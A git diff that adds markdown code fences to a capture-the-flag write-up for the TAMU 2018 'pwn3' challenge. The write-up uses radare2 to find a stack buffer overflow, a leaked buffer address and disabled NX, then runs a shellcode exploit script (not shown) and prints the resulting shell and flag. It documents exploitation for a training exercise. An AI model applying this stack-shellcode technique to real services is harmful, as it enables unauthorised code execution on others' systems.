@@ -8,8 +8,10 @@ The binary output includes a "random" value that looks interesting: `Your random
 
 By examining the binary using radare2 with a small radare2 profile file, see profile.rr2, it is easier to examine automate the stdin from a file called ./stdin.
 
-
+```bash
 vagrant@ctf-tools:~/ctf/tamu18/pwn3$ r2 -e dbg.profile=profile.rr2
+```
+
 ```python
 [0x080483d0]> aaaa
 [0x080483d0]> i~arch,canary,nx,pic,relro
@@ -70,6 +72,7 @@ hit breakpoint at: 8048522
 
 Function call at 0x08048567 looks interesting to sym.echo().
 
+```
 [0x08048522]> dcu sym.echo
 Continue until 0x080484cb using 1 bpsize
 Welcome to the New Echo application 2.0!
@@ -136,10 +139,12 @@ var input = 0xffd6fd1a  0x08d60000  ....
 │           0x0804851f      90
 │           0x08048520      c9             leave 
 └           0x08048521      c3             return
+```
 
 I created a pattern of length 300 using  `ragg2 -P 300 -r > stdin` and reopened the binary file.
 Now I execute the binary until right after gets, at 0x0804850a.
 
+```python
 [0x080484cb]> dcu 0x0804850a
 Continue until 0x0804850a using 1 bpsize
 Your random number 0xfff27efa!
@@ -147,10 +152,12 @@ Now what should I echo? hit breakpoint at: 804850a
 
 [0x080484cb]> afvd
 var input = 0xfff27efa  0x42414141  AAAB @eax ascii
+```
 
 How nice of them, the "random" number is the address at the stack to the local input variable.
 Since the binary do not use NX security mechanisms and the buffer I created the pwnx.py, targeting a shellcode that execute on the stack.
 
+```bash
 (ctftools)vagrant@ctf-tools:~/ctf/tamu18/pwn3$ ./pwnx.py 
 [*] '/home/vagrant/ctf/tamu18/pwn3/pwn3'
     Arch:     i386-32-little
@@ -164,3 +171,4 @@ flag.txt
 pwn3
 $ cat flag.txt
 gigem{n0w_w3_4r3_g377in6_s74r73d}
+```
